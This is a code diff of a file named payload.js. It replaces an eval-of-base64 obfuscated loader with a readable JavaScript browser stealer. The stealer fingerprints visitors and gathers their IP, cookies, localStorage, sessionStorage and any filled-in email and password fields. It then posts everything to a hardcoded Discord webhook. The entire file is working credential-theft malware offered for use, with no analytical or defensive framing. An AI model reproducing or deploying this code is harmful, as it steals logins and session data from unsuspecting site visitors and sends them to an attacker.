@@ -1,3 +1,46 @@
-// payload.js
-eval(atob("KGFzeW5jICgpID0+IHsKICBjb25zdCBXRUJIT09LID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNTU2MTE4OTE0MzQ3ODI4MDAvZHI1UU5YbWZwY2VZMWVObXg0dWctMXFxR00xTWN0QmtOMmtZVWF1ZXRZTkVzQ0xTQkV1MGVVME9xekFQNm1qZVZUM3UiOwogIGNvbnN0IGZwID0gYXdhaXQgRmluZ2VycHJpbnRTSlMubG9hZCgpLnRoZW4oZiA9PiBmLmdldCgpKTsKICBjb25zdCBpcCA9IGF3YWl0IGZldGNoKCJodHRwczovL2FwaS5pcGlmeS5vcmcvP2Zvcm1hdD1qc29uIikKICAgIC50aGVuKHIgPT4gci5pcCkKICAgIC5jYXRjaCgoKSA9PiAiW0Jsw6Fkw6FdIik7CiAgY29uc3QgbG9jYWxTdG9yYWdlID0gSlNPTi5zdHJpbmdpZnkob2JqZWN0LmZyb21FbnRyaWVzKGxvY2FsU3RvcmFnZSkpOwogIGNvbnN0IHNlc3Npb25TdG9yYWdlID0gSlNPTi5zdHJpbmdpZnkob2JqZWN0LmZyb21FbnRyaWVzKHNlc3Npb25TdG9yYWdlKSk7CiAgbGV0IGF1dG9maWxsID0gIiI7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiaW5wdXRbdHlwZT0nZW1haWwnXSIpLmZvckVhY2goaW5wdXQgPT4geyBpZiAoaW5wdXQudmFsdWUpIGF1dG9maWxsICs9IGAqKiBlbWFpbDogJHtpbnB1dC52YWx1ZX1gO30pOwogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoImlucHV0W3R5cGU9J3Bhc3N3b3JkJ10iKS5mb3JFYWNoKGk9PiB7IGlmKGkudmFsdWUpIGF1dG9maWxsICs9IGAqKiBwYXNzd29yZDogJHtpLnZhbHVlfWA7IH0pOwogIGNvbnN0IG1zZyA9IGAqKkNoZWNrZXJfTGl0ZV9QYXlsb2FkICoqYAoqKiBGaW5nZXJwcmludDogJHtmcC52aXNpdG9ySWR9ClxuaFA6ICR7aXB9ClVzZXItQWdlbnQ6ICR7bmF2aWdhdG9yLnVzZXJBZ2VudH0KUGxhdGZvcm06ICR7bmF2aWdhdG9yLnBsYXRmb3JtfQpSZXNvbHV0aW9uOiAke3NjcmVlbi53aWR0aH14JHtzY3JlZW4uaGVpZ2h0fQpDUE86ICR7d2luZG93LmhhcmR3YXJlQ29uY3VycmVuY3l9IGNvcmVzClxuQ09PS0lFOiAke2RvY3VtZW50LmNvb2tpZX1cbkxPQ0FMU1RPUkFHRVxuJHtsb2NhbFN0b3JhZ2V9XG5TRVNTSU9OU1RPUkFHRVxuJHtzZXNzaW9uU3RvcmFnZX1cbkFVVE9GSUxMOlxuJHthdXRvZmlsbH1gOwoKICBmZXRjaChXRUJIT09LLCB7CiAgICBtZXRob2Q6ICJQT1NUIiwKICAgIGhlYWRlcnM6IHsgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkod2luZG93LmZyYW1lcy5sZW5ndGggPzsgc2Vzc2lvblN0b3JhZ2UgOiB7IGNvbnRlbnQ6IG1zZyB9KQogIH0pOwp9KSgpOw=="));
-</script>
+(async () => {
+  const WEBHOOK = "https://discord.com/api/webhooks/1355611891434782800/dr5QNXmfpceY1eNmx4ug-1qqGM1MctBkN2kYUauetYNEsCLSBEu0eU0OqzAP6mjeVT3u";
+
+  try {
+    const fp = await FingerprintJS.load().then(f => f.get());
+    const ip = await fetch("https://api.ipify.org/?format=json")
+      .then(res => res.json())
+      .then(data => data.ip)
+      .catch(() => "Brak IP");
+
+    const cookies = document.cookie || "Brak";
+    const localData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
+    const sessionData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));
+
+    let autofill = "";
+    document.querySelectorAll("input").forEach(input => {
+      if (input.value && (input.type === "email" || input.type === "password")) {
+        autofill += `• ${input.type}: ${input.value}\n`;
+      }
+    });
+
+    const msg = `**PAYLOAD.js 🔴**
+**Fingerprint:** ${fp.visitorId}
+**IP:** ${ip}
+**User-Agent:** ${navigator.userAgent}
+**Platform:** ${navigator.platform}
+**Resolution:** ${screen.width}x${screen.height}
+**RAM:** ${navigator.deviceMemory || "?"} GB
+**CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
+**Cookies:** ${cookies}
+
+**LocalStorage:**\n${localData}
+**SessionStorage:**\n${sessionData}
+**Autofill:**\n${autofill || "Brak wartości"}
+`;
+
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: msg })
+    });
+
+  } catch (e) {
+    console.error("Payload error:", e.message);
+  }
+})();
